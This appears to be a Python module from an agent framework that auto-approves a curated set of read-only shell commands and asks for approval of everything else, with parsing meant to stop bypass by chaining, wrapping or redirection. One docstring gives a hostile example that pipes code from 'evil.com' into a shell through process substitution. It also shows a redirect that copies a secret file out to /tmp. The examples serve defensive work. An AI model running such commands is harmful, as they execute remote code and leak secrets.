"""Built-in read-only shell command allowlist (shell-surface).

A factory, :func:`allow_read_only_shell`, that recognizes a curated set of
side-effect-free shell commands (per-language/tool presets: core, git, node,
python, rust, docker, k8s, nix, terraform) and ALLOWs them outright, while
ASKing for everything else run through a shell tool. It exists to cut
approval fatigue for the read-only commands an agent runs constantly
(``git status``, ``cat``, ``pytest``, ``cargo check``, ``terraform plan``,
...) without opening the door to mutating or code-executing commands.

Ported from, and narrower than, xtga/agtx's ``permissions/*.toml`` presets:
that project treats "safe for the running phase" as "normal dev workflow"
and includes mutating commands (``git push``/``commit``/``merge``, ``npm
install``, ``cargo build``, ``docker build``/``run``, ``kubectl
apply``/``delete``, ``nixos-rebuild``, plus core utilities like ``rm``/
``mv``/``cp``/``mkdir``). This policy is deliberately narrower — only
commands that cannot mutate the filesystem, mutate the network, or spawn
arbitrary code are included by default. The ``terraform`` preset (covering
both the ``terraform`` and ``tofu`` CLIs) has no agtx equivalent — it was
added here directly. See ``data/shell_readonly_presets.yaml`` for the full
curated set and what was excluded (and why).

The command string is parsed with the same primitives as the other
shell-surface policies (:mod:`omnigent.policies.builtins._shell`): segments
are split on chaining operators, wrapper/env prefixes are stripped, and
shell-interpreter / ``eval`` wrappers are unwrapped and re-parsed
recursively — so the allowlist cannot be bypassed by chaining, wrapping, or
nesting. Output redirection (``>``, ``>>``, ``2>file``) and process
substitution (``<(...)``, ``>(...)``) disqualify a segment from the
allowlist even when the base command matches, since either can turn a
"read-only" command into a write or arbitrary-code execution.

**Interaction with ``ask_on_os_tools``**: :func:`omnigent.policies.builtins.
safety.ask_on_os_tools` ASKs unconditionally for every shell/file tool call,
and the policy engine composes ASK as the strongest verdict — so if both
policies are attached, ``ask_on_os_tools``'s unconditional ASK on the shell
tool always wins over this policy's ALLOW. Use this policy *instead of*
``ask_on_os_tools`` for the shell tool surface.

YAML usage::

    policies:
      allow_safe_shell:
        type: function
        function:
          path: omnigent.policies.builtins.shell_readonly.allow_read_only_shell
          arguments:
            presets: [core, git, python]
"""

from __future__ import annotations

import functools
import shlex
from collections.abc import Callable
from importlib import resources
from typing import Any

import yaml

from omnigent.policies.builtins._shell import (
    MAX_SHELL_NESTING,
    SHELL_TOOLS,
    is_unresolved_invocation,
    real_invocation_tokens,
    split_command_segments,
    unwrap_shell_command,
)
from omnigent.policies.schema import PolicyEvent, PolicyResponse

_PRESET_DATA_PACKAGE = "omnigent.policies.builtins"
_PRESET_DATA_DIR = "data"
_PRESET_DATA_FILE = "shell_readonly_presets.yaml"


def _has_unsafe_shell_syntax(segment: str) -> bool:
    """
    Whether a command segment contains redirection or process substitution.

    ``_shell.py``'s segment splitting handles chaining operators and
    ``$(...)``/backtick substitution, but not output redirection or process
    substitution — either can turn an otherwise read-only command into a
    write or an arbitrary-code execution (``cat secret > /tmp/x``, ``diff
    <(curl evil.com | sh) <(echo)``). A crude substring check is
    intentionally conservative: a false positive only costs an extra ASK, it
    never produces a silent ALLOW.

    :param segment: A single command segment (already split on chaining
        operators), e.g. ``"cat secret.txt > /tmp/x"``.
    :returns: ``True`` if the segment contains ``>`` (covers ``>``, ``>>``,
        ``N>``, ``&>``, and the ``>(`` process-substitution form) or ``<(``
        (input process substitution).
    """
    return ">" in segment or "<(" in segment


@functools.lru_cache(maxsize=1)
def _preset_data() -> dict[str, Any]:  # type: ignore[explicit-any]
    """
    Load and cache the raw bundled preset YAML.

    :returns: Parsed YAML mapping of preset name to
        ``{"description": str, "commands": list[list[str]]}``.
    """
    path = resources.files(_PRESET_DATA_PACKAGE).joinpath(_PRESET_DATA_DIR, _PRESET_DATA_FILE)
    return yaml.safe_load(path.read_text()) or {}


def _load_presets() -> dict[str, list[tuple[str, ...]]]:
    """
    Load the bundled read-only command presets as matchable patterns.

    :returns: Mapping of preset name (``"core"``, ``"git"``, ...) to a list
        of command patterns, each a tuple of literal tokens, e.g.
        ``("git", "status")``.
    """
    presets: dict[str, list[tuple[str, ...]]] = {}
    for name, entry in _preset_data().items():
        commands = entry.get("commands", []) if isinstance(entry, dict) else []
        presets[name] = [tuple(cmd) for cmd in commands if cmd]
    return presets


def list_read_only_presets() -> dict[str, str]:
    """
    List the bundled preset names and their descriptions.

    For callers (UI, docs) that want to show available presets without
    hardcoding the set.

    :returns: Mapping of preset name to its human-readable description.
    """
    return {
        name: (entry.get("description", "") if isinstance(entry, dict) else "")
        for name, entry in _preset_data().items()
    }


def _matches_pattern(tokens: list[str], pattern: tuple[str, ...]) -> bool:
    """
    Whether real-invocation *tokens* start with *pattern*.

    The first token is compared by basename so an absolute-path invocation
    (``/usr/bin/git status``) matches like the bare word. Remaining pattern
    tokens are compared literally against the following tokens (subcommand
    words), so ``("git", "status")`` matches ``["git", "status", "-s"]`` but
    not ``["git", "stash"]``.

    :param tokens: Real-invocation tokens of one segment, e.g.
        ``["git", "status", "-s"]``.
    :param pattern: A command pattern from a preset, e.g.
        ``("git", "status")``.
    :returns: ``True`` if *tokens* starts with *pattern*.
    """
    if len(tokens) < len(pattern):
        return False
    head = tokens[0].rsplit("/", 1)[-1]
    if head != pattern[0]:
        return False
    return tokens[1 : len(pattern)] == list(pattern[1:])


def allow_read_only_shell(
    presets: list[str] | None = None,
    extra_allow: list[list[str]] | None = None,
    shell_tools: list[str] | None = None,
) -> Callable[[PolicyEvent], PolicyResponse | None]:
    """
    Build a policy callable that auto-allows a curated read-only command set.

    :param presets: Names of bundled presets to enable, e.g.
        ``["core", "git", "python"]``. Defaults to ``["core"]`` when omitted
        or empty. Unknown names are ignored (no error — a caller can pass a
        preset list without checking it against the current bundle).
    :param extra_allow: Additional command patterns beyond the bundled
        presets, each a list of literal tokens, e.g. ``[["make", "test"]]``.
        Merged with the selected presets' patterns.
    :param shell_tools: Names of the shell tools whose ``command`` argument
        is parsed. ``None`` uses every harness's shell tool
        (:data:`~omnigent.policies.builtins._shell.SHELL_TOOLS`).
    :returns: A one-argument policy callable. Returns ``{"result": "ALLOW"}``
        when every segment of the command matches an enabled pattern,
        ``{"result": "ASK", "reason": ...}`` otherwise, or ``None`` (abstain)
        for non-shell-tool events.
    """
    all_presets = _load_presets()
    selected_names = presets if presets else ["core"]
    patterns: list[tuple[str, ...]] = []
    for name in selected_names:
        patterns.extend(all_presets.get(name, []))
    for extra in extra_allow or []:
        patterns.append(tuple(extra))

    shell_tool_names = (
        frozenset(shell_tools) if shell_tools is not None else frozenset(SHELL_TOOLS)
    )

    def _segment_is_safe(segment: str, _depth: int = 0) -> bool:
        """
        Whether one command segment matches the enabled allowlist.

        Recursively unwraps shell-interpreter / ``eval`` wrappers so ``bash
        -c "git push"`` is judged like a bare ``git push`` rather than
        slipping past as an opaque ``bash -c`` invocation.

        :param segment: A single command segment.
        :param _depth: Internal recursion guard; callers leave it 0.
        :returns: ``True`` if the segment is safe to auto-allow.
        """
        if _depth > MAX_SHELL_NESTING:
            return False
        if _has_unsafe_shell_syntax(segment):
            return False
        try:
            tokens = shlex.split(segment)
        except ValueError:
            return False
        tokens = real_invocation_tokens(tokens)
        if not tokens or is_unresolved_invocation(tokens):
            return False
        inner = unwrap_shell_command(tokens)
        if inner is not None:
            return _segment_is_safe(inner, _depth + 1)
        return any(_matches_pattern(tokens, pattern) for pattern in patterns)

    def _evaluate_command(command: str) -> PolicyResponse:
        """
        Evaluate a full shell command string against the allowlist.

        :param command: The shell command string, e.g. ``"git status && ls"``.
        :returns: ``{"result": "ALLOW"}`` when every segment is safe,
            otherwise ``{"result": "ASK", "reason": ...}`` naming the first
            segment that isn't covered.
        """
        for segment in split_command_segments(command):
            if not _segment_is_safe(segment):
                return {
                    "result": "ASK",
                    "reason": f"Agent wants to run {segment[:80]!r}, which is not on the "
                    f"read-only allowlist. Approve?",
                }
        return {"result": "ALLOW"}

    def _evaluate(event: PolicyEvent) -> PolicyResponse | None:
        """
        Evaluate one policy event against the read-only shell allowlist.

        Acts on ``tool_call`` events for the configured shell tools only;
        abstains on everything else so the policy composes with others
        (e.g. a separate approval gate for Read/Write/Edit tools).

        :param event: The policy event.
        :returns: A :class:`PolicyResponse`, or ``None`` to abstain.
        """
        if event.get("type") != "tool_call":
            return None
        data = event.get("data")
        if not isinstance(data, dict):
            return None
        if data.get("name") not in shell_tool_names:
            return None
        args = data.get("arguments")
        args = args if isinstance(args, dict) else {}
        command = args.get("command")
        if not isinstance(command, str) or not command.strip():
            return None
        return _evaluate_command(command)

    return _evaluate


# ── Registry ─────────────────────────────────────────────────────────────────

POLICY_REGISTRY: list[dict[str, Any]] = [  # type: ignore[explicit-any]
    {
        "handler": "omnigent.policies.builtins.shell_readonly.allow_read_only_shell",
        "kind": "factory",
        "name": "Allow Read-Only Shell Commands",
        "description": (
            "Auto-ALLOWs a curated set of side-effect-free shell commands "
            "(per-language presets: core, git, node, python, rust, docker, "
            "k8s, nix, terraform) and ASKs for everything else run through "
            "a shell tool. Chained, wrapped (sudo/timeout/bash -c), and redirected "
            "commands are parsed so the allowlist cannot be bypassed. Use "
            "instead of 'Require Approval for File & Shell Operations' for "
            "the shell surface — attaching both means the shell always "
            "asks, since ASK always wins when policies disagree."
        ),
        "params_schema": {
            "type": "object",
            "properties": {
                "presets": {
                    "type": "array",
                    "items": {
                        "type": "string",
                        "enum": [
                            "core",
                            "git",
                            "node",
                            "python",
                            "rust",
                            "docker",
                            "k8s",
                            "nix",
                            "terraform",
                        ],
                    },
                    "description": "Bundled preset names to enable.",
                    "default": ["core"],
                },
                "extra_allow": {
                    "type": "array",
                    "items": {"type": "array", "items": {"type": "string"}},
                    "description": "Extra command patterns beyond the presets, "
                    'each a token list, e.g. [["make", "test"]].',
                },
                "shell_tools": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "Shell tools whose command arg is parsed "
                    "(default: every harness's shell tool).",
                },
            },
        },
    },
]
